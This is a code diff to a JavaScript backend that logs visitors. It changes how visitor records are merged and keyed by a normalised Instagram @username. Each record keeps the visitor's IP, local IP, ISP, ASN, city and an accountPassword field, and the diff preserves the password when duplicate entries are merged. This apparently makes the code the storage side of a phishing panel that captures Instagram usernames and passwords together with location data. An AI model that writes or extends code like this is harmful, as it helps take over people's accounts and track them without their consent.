@@ -1825,7 +1825,14 @@ function isVisitorTombstoned(item, logsMeta = {}) {
   return false;
 }
 
-// Consolidate duplicate visitor entries (by same normalized Name/Phone or ID) and archive older snapshots inside `previousLogs`
+const VALID_IG_USERNAME_REGEX = /^[a-z0-9._]{1,30}$/;
+
+function normalizeIgUsername(raw = '') {
+  return String(raw || '').trim().replace(/^@+/, '').toLowerCase();
+}
+
+// Consolidate duplicate visitor entries (by same normalized @username) and archive older snapshots inside `previousLogs`
+// Only keeps valid @username accounts (never saves or displays standalone phone-name / auto-device entries)
 function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = {}) {
   const mapByKey = new Map();
   // Find any known real public IP in the logs to heal legacy ::1 loopback entries
@@ -1838,12 +1845,23 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
 
   for (const item of sorted) {
     if (!item || isVisitorTombstoned(item, logsMeta)) continue;
-    const key = getVisitorCanonicalKey(item);
+    const rawVName = String(item.visitorName || '').trim();
+    const cleanUser = normalizeIgUsername(item.username || (!rawVName.includes('•') ? rawVName : ''));
+    // Skip any phone-name / auto-device record that does not have a valid @username
+    if (item.isDeviceIpAutoAuth || !cleanUser || !VALID_IG_USERNAME_REGEX.test(cleanUser) || rawVName.includes('•')) {
+      continue;
+    }
+
+    const key = `user:${cleanUser}`;
     const resolvedIp = !isLoopbackIp(item.ip) ? item.ip : (firstKnownRealIp || item.ip);
+    const formattedUsername = `@${cleanUser}`;
 
     if (!mapByKey.has(key)) {
       mapByKey.set(key, {
         ...item,
+        visitorName: formattedUsername,
+        username: formattedUsername,
+        isDeviceIpAutoAuth: false,
         ip: resolvedIp,
         localIp: item.localIp || '',
         asn: item.asn || '',
@@ -1856,6 +1874,8 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
               const snapIp = !isLoopbackIp(snap.ip) ? snap.ip : resolvedIp;
               return {
                 ...snap,
+                visitorName: formattedUsername,
+                username: formattedUsername,
                 ip: snapIp,
                 localIp: snap.localIp || item.localIp || '',
                 isp: normalizeRealIspName(snap.isp, snap.country || item.country, snapIp),
@@ -1866,14 +1886,14 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
       });
     } else {
       const primary = mapByKey.get(key);
+      primary.visitorName = formattedUsername;
+      primary.username = formattedUsername;
+      primary.isDeviceIpAutoAuth = false;
       if (isLoopbackIp(primary.ip) && !isLoopbackIp(resolvedIp)) {
         primary.ip = resolvedIp;
       }
       if (!primary.localIp && item.localIp) {
         primary.localIp = item.localIp;
-      }
-      if (!primary.username && item.username) {
-        primary.username = item.username;
       }
       if (!primary.accountPassword && item.accountPassword) {
         primary.accountPassword = item.accountPassword;
@@ -1891,7 +1911,8 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
       primary.previousLogs.push({
         archivedAt: item.lastSeen || item.firstSeen || new Date().toISOString(),
         previousLastSeen: item.lastSeen || item.firstSeen,
-        visitorName: item.visitorName,
+        visitorName: formattedUsername,
+        username: formattedUsername,
         ip: resolvedIp,
         localIp: item.localIp || '',
         city: item.city,
@@ -1907,6 +1928,8 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
         for (const oldSnap of item.previousLogs) {
           primary.previousLogs.push({
             ...oldSnap,
+            visitorName: formattedUsername,
+            username: formattedUsername,
             ip: !isLoopbackIp(oldSnap.ip) ? oldSnap.ip : resolvedIp
           });
         }
@@ -1921,12 +1944,6 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
   }
 
   return Array.from(mapByKey.values());
-}
-
-const VALID_IG_USERNAME_REGEX = /^[a-z0-9._]{1,30}$/;
-
-function normalizeIgUsername(raw = '') {
-  return String(raw || '').trim().replace(/^@+/, '').toLowerCase();
 }
 
 function syncSavedAccountsMap(logs) {
@@ -1962,6 +1979,11 @@ async function recordVisitor(info) {
   const rawUsername = normalizeIgUsername(info.username || info.visitorName || '');
   const cleanPassword = String(info.accountPassword || '').trim();
   const isAutoDeviceOnly = Boolean(info.isAutoDeviceVisit) || authMode === 'auto_device' || (!rawUsername && !info.visitorName);
+
+  // Do NOT save separate phone-name / auto-device records; only save authenticated @username accounts
+  if (isAutoDeviceOnly) {
+    return { ignoredAutoDevice: true };
+  }
 
   // Strict Instagram-style username + password validation & authentication for non-auto visits
   if (!isAutoDeviceOnly) {
